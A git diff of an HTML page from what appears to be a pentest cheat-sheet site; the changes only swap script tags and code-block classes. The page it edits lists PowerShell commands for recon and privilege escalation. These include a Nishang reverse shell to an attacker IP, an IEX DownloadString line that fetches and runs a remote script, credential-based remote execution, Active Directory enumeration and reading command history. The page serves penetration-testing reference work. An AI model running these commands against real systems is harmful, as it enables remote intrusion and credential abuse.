@@ -19,9 +19,7 @@
     var mkdocs_page_input_path = "powershell.md";
     var mkdocs_page_url = "/powershell/";
   </script>
-  
-  <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
+   
 </head>
 
 <body class="ready sticky">
@@ -309,7 +307,7 @@
               <h1 id="powershell">PowerShell</h1>
 <p>Some useful PowerShell commands that you can use during your recon or privsec phases.</p>
 <h2 id="execute-block-as-an-other-user">Execute block as an other user</h2>
-<pre><code class="language-powershell line-numbers">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
+<pre><code class="language-powershell">$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;dom&gt;\&lt;username&gt;&quot;, $pass)
 Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { cmd.exe &quot;/c &lt;cmd&gt;&quot; }
 </code></pre>
@@ -318,7 +316,7 @@ Invoke-Command -Computer &lt;computer_name&gt; -Credential $cred -ScriptBlock { 
 <p>The repository <a href="https://github.com/samratashok/nishang" target="_blank">Nishang</a> contains a good
 PowerShell script to create a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">reverse shell</a>.
 You need to add the following line at the end:</p>
-<pre><code class="language-powershell line-numbers">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
+<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress &lt;ip&gt; -Port &lt;port&gt;
 </code></pre>
 
 <p>On your local machine:</p>
@@ -327,11 +325,11 @@ You need to add the following line at the end:</p>
 <li>Listen for an incoming <a href="../reverse-shell/#listen-with-netcat">connection with nc</a>.</li>
 </ul>
 <p>On the remote host, execute the following PowerShell script:</p>
-<pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
+<pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
 
 <h2 id="execute-c-dll-from-powershell">Execute C# DLL from Powershell</h2>
-<pre><code class="language-powershell line-numbers"># Load a dll to Powershell
+<pre><code class="language-powershell"># Load a dll to Powershell
 [Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Service.dll&quot;)
 [Reflection.Assembly]::LoadFile(&quot;C:\Path\MyNamespace.Cryptography.dll&quot;)
 
@@ -347,7 +345,7 @@ $c.Decrypt(&quot;CIPHER_TEXT&quot;, [MyNamespace.Service.Config]::ApplicationKey
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <p>Here is snippets of Powershell commands to interact with AD LDAP. You can also
 use customize filters to get vulnerable users (<a href="../windows/#list-spn-accounts">SPN</a>, ...)</p>
-<pre><code class="language-powershell line-numbers"># Helping functions
+<pre><code class="language-powershell"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
     return (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=User)(samAccountName=$user))&quot;)).FindOne().GetDirectoryEntry()
 }
@@ -384,15 +382,15 @@ foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samac
 </code></pre>
 
 <h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
-<pre><code class="language-powershell line-numbers">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+<pre><code class="language-powershell">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
 </code></pre>
 
 <h3 id="get-user-owner">Get user owner</h3>
-<pre><code class="language-powershell line-numbers">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
+<pre><code class="language-powershell">Get-ADUser $USERNAME | ForEach-Object {Get-ACL &quot;AD:\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner}
 </code></pre>
 
 <h3 id="list-deleted-users">List deleted users</h3>
-<pre><code class="language-powershell line-numbers">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+<pre><code class="language-powershell">$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
 $objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter &quot;(objectClass=user)&quot; -IncludeDeletedObjects -properties *
 foreach ($object in $objects) { $object }
 </code></pre>
@@ -402,20 +400,20 @@ foreach ($object in $objects) { $object }
 <p>The <a href="https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps" target="_blank"><code>Get-NetTCPConnection</code></a>
 cmdlets lists TCP connections. By default the processes pid is return, so the
 following command line select the process name instead.</p>
-<pre><code class="language-powershell line-numbers">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
+<pre><code class="language-powershell">Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name=&quot;Process&quot;;Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
 </code></pre>
 
 <h3 id="list-email-aliases">List Email aliases</h3>
-<pre><code class="language-powershell line-numbers">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
+<pre><code class="language-powershell">$ (Get-ADUser -Identity &lt;user_ad_id&gt; -Properties proxyAddresses).proxyAddresses
 </code></pre>
 
 <h3 id="get-powershell-command-history">Get PowerShell command history</h3>
-<pre><code class="language-powershell line-numbers">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
+<pre><code class="language-powershell">cd &quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline&quot;
 gc ConsoleHost_history.txt
 </code></pre>
 
 <h3 id="convert-dacl">Convert DACL</h3>
-<pre><code class="language-powershell line-numbers">$acl = get-acl HKLM:\System\CurrentControlSet\Services
+<pre><code class="language-powershell">$acl = get-acl HKLM:\System\CurrentControlSet\Services
 ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
 </code></pre>
             
@@ -444,18 +442,8 @@ ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js"></script>
-    <script src="../js/prism-core.min.js"></script>
-    <script src="../js/prism-line-numbers.min.js"></script>
-    <script src="../js/prism-clike.min.js"></script>
-    <script src="../js/prism-yaml.min.js"></script>
-    <script src="../js/prism-powershell.min.js"></script>
-    <script src="../js/prism-bash.min.js"></script>
-    <script src="../js/prism-nginx.min.js"></script>
-    <script src="../js/prism-python.min.js"></script>
-    <script src="../js/prism-markup.min.js"></script>
-    <script src="../js/prism-markup-templating.min.js"></script>
-    <script src="../js/prism-php.min.js"></script>
+    <script async src="../js/theme.js"></script>
+    <script async src="../js/prism.min.js"></script>
     <script src="../search/main.js"></script>
     
     <script>
